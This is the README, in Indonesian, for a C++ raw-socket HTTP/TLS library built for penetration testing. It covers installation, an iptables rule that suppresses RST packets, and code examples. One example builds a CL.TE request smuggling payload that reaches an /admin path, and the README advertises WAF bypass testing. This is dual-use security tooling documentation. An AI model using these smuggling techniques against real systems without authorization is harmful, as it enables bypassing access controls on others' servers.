# HAQuests - HTTP Library dengan Raw Socket C++

> Low-Level HTTP/TLS Security Testing Library untuk Penetration Testing dan Security Research

[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![C++](https://img.shields.io/badge/C++-17-blue.svg)](https://en.cppreference.com/w/cpp/17)
[![Platform](https://img.shields.io/badge/platform-Linux-lightgrey.svg)](https://www.kernel.org/)

## 📖 Tentang HAQuests

HAQuests adalah library C++ yang dirancang khusus untuk security research dan penetration testing dengan fokus pada manipulasi low-level network protocol. Library ini memberikan kontrol penuh terhadap HTTP/TLS communication melalui raw socket, memungkinkan testing untuk vulnerability seperti HTTP request smuggling.

### Fitur Utama

- **🔧 Raw Socket Control**: Manipulasi langsung TCP packets pada network layer
- **🔒 TLS/SSL Support**: Integrasi OpenSSL untuk HTTPS dengan custom BIO adapter
- **⚡ HTTP Request Smuggling**: Built-in support untuk CL.TE, TE.CL, dan TE.TE techniques
- **🛡️ Security Testing**: Tools untuk WAF bypass dan parser differential analysis
- **📦 Modular Design**: Arsitektur berlapis (Core, TCP, TLS, HTTP, Utils)

### Kasus Penggunaan

- HTTP Request Smuggling vulnerability testing
- Web Application Firewall (WAF) bypass testing
- Network protocol research dan analysis
- Penetration testing dengan custom HTTP behaviors
- TLS/SSL security testing

## ⚠️ Disclaimer

**PENTING**: Library ini dirancang khusus untuk authorized security testing dan research purposes. Penggunaan tanpa izin terhadap sistem yang bukan milik Anda atau tanpa explicit permission dapat melanggar hukum dan regulasi. Selalu pastikan Anda memiliki izin eksplisit sebelum melakukan testing terhadap sistem apapun.

## 🚀 Instalasi

### Prerequisites

- Linux (Ubuntu 20.04+ atau distribusi lain)
- C++17 compiler (GCC 9+ atau Clang 10+)
- CMake 3.15 atau lebih tinggi
- OpenSSL 1.1.1+
- libpcap development package
- CAP_NET_RAW capability atau root access
- Docker (opsional, untuk development)

#### Install Dependencies

```bash
# Ubuntu/Debian
sudo apt-get update
sudo apt-get install -y build-essential cmake libssl-dev libpcap-dev

# Fedora/RHEL
sudo dnf install -y gcc-c++ cmake openssl-devel libpcap-devel

# Arch Linux
sudo pacman -S base-devel cmake openssl libpcap
```

### Build dari Source

```bash
# Clone repository
git clone https://github.com/HazaVVIP/haquests.git
cd haquests

# Buat build directory
mkdir build && cd build

# Configure dan compile
cmake ..
make -j$(nproc)

# Install (membutuhkan sudo)
sudo make install

# Update linker cache
sudo ldconfig
```

**Catatan**: Jika build berhasil, library akan diinstall ke `/usr/local/lib/` dan header files ke `/usr/local/include/haquests/`.

### Verifikasi Instalasi

Setelah instalasi, verifikasi bahwa library terinstall dengan benar:

```bash
# Cek library file
ls -l /usr/local/lib/libhaquests.so*

# Cek header files
ls -l /usr/local/include/haquests/

# Test compile simple program
cat > test.cpp << 'EOF'
#include <haquests/haquests.hpp>
#include <iostream>
int main() {
    std::cout << "HAQuests OK!" << std::endl;
    return 0;
}
EOF

g++ -std=c++17 test.cpp -lhaquests -lssl -lcrypto -o test
./test
```

### Development dengan Docker

```bash
# Build dan jalankan container
docker-compose up -d haquests-dev
docker-compose exec haquests-dev bash

# Build di dalam container
mkdir build && cd build
cmake -DCMAKE_BUILD_TYPE=Debug ..
make -j$(nproc)
```

## 📚 Cara Penggunaan

### Setup Firewall (PENTING!)

HAQuests menggunakan raw socket untuk membuat koneksi TCP. Untuk mencegah kernel Linux mengirim paket RST yang mengganggu koneksi raw socket, Anda perlu menambahkan aturan iptables:

```bash
# Jalankan script setup firewall (hanya perlu dilakukan sekali)
sudo ./scripts/setup_firewall.sh
```

Script ini akan menambahkan aturan iptables untuk memblokir paket RST keluar dari port yang digunakan HAQuests. **Tanpa langkah ini, koneksi TCP tidak akan berfungsi dengan benar.**

Untuk menghapus aturan firewall:

```bash
# Hapus aturan firewall
sudo ./scripts/cleanup_firewall.sh
```

**Catatan**: Aturan firewall akan hilang setelah reboot kecuali Anda membuatnya persisten. Lihat output dari `setup_firewall.sh` untuk instruksi lebih lanjut.

### Menjalankan Contoh Program

Setelah build dan setup firewall, Anda bisa menjalankan contoh program yang sudah disediakan:

```bash
# Dari root directory repository
cd build/examples

# Jalankan simple HTTP GET (memerlukan sudo untuk raw socket)
sudo ./simple_http_get http://example.com

# Jalankan TLS connection test
sudo ./tls_connection https://www.google.com

# Jalankan HTTP smuggling demo (hanya untuk testing di lab sendiri!)
sudo ./smuggling_clte
```

**PENTING**: Program-program ini memerlukan CAP_NET_RAW capability. Alternatif untuk sudo:

```bash
# Set capability pada executable
sudo setcap cap_net_raw=eip ./simple_http_get
# Sekarang bisa dijalankan tanpa sudo
./simple_http_get http://example.com
```

### 1. Basic HTTP Request

```cpp
#include <haquests/haquests.hpp>
#include <iostream>

int main() {
    using namespace haquests;
    
    // Buat HTTP request
    HTTP::Request request;
    request.setMethod("GET");
    request.setPath("/");
    request.setVersion("HTTP/1.1");
    request.addHeader("Host", "example.com");
    request.addHeader("User-Agent", "HAQuests/1.0");
    
    // Buat TCP connection
    TCP::Connection conn("93.184.216.34", 80); // example.com IP
    conn.connect();
    
    // Kirim request
    std::string rawRequest = request.build();
    conn.send(rawRequest);
    
    // Terima response
    std::string response = conn.receive();
    std::cout << response << std::endl;
    
    return 0;
}
```

### 2. HTTPS Request dengan TLS

```cpp
#include <haquests/haquests.hpp>
#include <iostream>

int main() {
    using namespace haquests;
    
    // Buat TLS connection
    TLS::Connection tls_conn("www.google.com", 443);
    tls_conn.connect();
    
    // Buat dan kirim HTTPS request
    HTTP::Request request;
    request.setMethod("GET");
    request.setPath("/");
    request.setVersion("HTTP/1.1");
    request.addHeader("Host", "www.google.com");
    
    tls_conn.send(request.build());
    
    // Baca response
    std::string response = tls_conn.receive();
    std::cout << response << std::endl;
    
    return 0;
}
```

### 3. HTTP Request Smuggling (CL.TE)

```cpp
#include <haquests/haquests.hpp>
#include <iostream>

int main() {
    using namespace haquests;
    
    // CATATAN: Hanya gunakan untuk authorized testing!
    
    // Buat smuggling request
    HTTP::Smuggling smuggler;
    smuggler.setType(HTTP::Smuggling::Type::CL_TE);
    
    // Request pertama (akan dilihat front-end)
    std::string frontendRequest = 
        "GET / HTTP/1.1\r\n"
        "Host: vulnerable-site.com\r\n\r\n";
    
    // Request kedua (akan di-smuggle ke back-end)
    std::string backendRequest = 
        "GET /admin HTTP/1.1\r\n"
        "Host: vulnerable-site.com\r\n\r\n";
    
    // Build smuggling payload
    std::string payload = smuggler.build(frontendRequest, backendRequest);
    
    // Kirim menggunakan raw TCP
    TCP::Connection conn("target-ip", 80);
    conn.connect();
    conn.send(payload);
    
    std::string response = conn.receive();
    std::cout << response << std::endl;
    
    return 0;
}
```

### 4. Compile dan Run Program Anda

#### Setelah Install Library

Jika library sudah terinstall dengan `sudo make install`:

```bash
# Compile program Anda
g++ -std=c++17 my_program.cpp -lhaquests -lssl -lcrypto -o my_program

# Jalankan (membutuhkan CAP_NET_RAW atau root)
sudo ./my_program

# Atau dengan setcap (lebih aman dari sudo)
sudo setcap cap_net_raw=eip ./my_program
./my_program
```

#### Tanpa Install Library (link langsung dari build directory)

```bash
# Compile dengan link langsung ke build directory
g++ -std=c++17 my_program.cpp \
    -I/path/to/haquests/include \
    -L/path/to/haquests/build/src \
    -lhaquests -lssl -lcrypto \
    -Wl,-rpath,/path/to/haquests/build/src \
    -o my_program

# Jalankan
sudo ./my_program
```

#### Troubleshooting

Jika mendapat error "cannot find -lhaquests":
```bash
# Pastikan library path sudah dikonfigurasi
sudo ldconfig
# Atau tambahkan path secara manual
export LD_LIBRARY_PATH=/usr/local/lib:$LD_LIBRARY_PATH
```

Jika mendapat error "cannot open shared object file":
```bash
# Jalankan ldconfig
sudo ldconfig
# Atau set LD_LIBRARY_PATH
export LD_LIBRARY_PATH=/usr/local/lib:$LD_LIBRARY_PATH
```

Jika mendapat error "CAP_NET_RAW capability required":
```bash
# Opsi 1: Jalankan dengan sudo
sudo ./my_program

# Opsi 2: Set capability (lebih aman)
sudo setcap cap_net_raw=eip ./my_program
./my_program
```

## 🏗️ Arsitektur

HAQuests menggunakan arsitektur berlapis:

1. **Core Layer**: Raw socket, packet structures, checksums
2. **TCP Layer**: Connection management, state machine (RFC 793), flow control
3. **TLS Layer**: OpenSSL wrapper dengan custom BIO adapter
4. **HTTP Layer**: Request/response parsing, smuggling techniques
5. **Utils Layer**: Logging, error handling, buffers, timers

Lihat file **DIR.md** untuk detail struktur direktori dan penjelasan setiap file.

## 🧪 Testing

```bash
# Build dengan tests
cd build
cmake -DBUILD_TESTS=ON ..
make -j$(nproc)

# Jalankan unit tests
sudo ./tests/run_tests

# Atau individual test
sudo ./tests/unit/test_checksum
sudo ./tests/unit/test_http_parser
```

## 📄 Lisensi

Proyek ini dilisensikan di bawah MIT License - lihat file [LICENSE](LICENSE) untuk detail.

## 🙏 Acknowledgments

- OpenSSL team untuk TLS/SSL library
- libpcap developers untuk packet capture support
- Security research community
- PortSwigger Research untuk HTTP Request Smuggling research

## 📞 Kontak

- GitHub: [@HazaVVIP](https://github.com/HazaVVIP)
- Repository: [haquests](https://github.com/HazaVVIP/haquests)

## ⚖️ Legal Notice

This tool is provided for educational and authorized testing purposes only. The authors are not responsible for any misuse or damage caused by this tool. Always ensure you have explicit permission before testing any system.

---

**Made with ❤️ for the security research community**
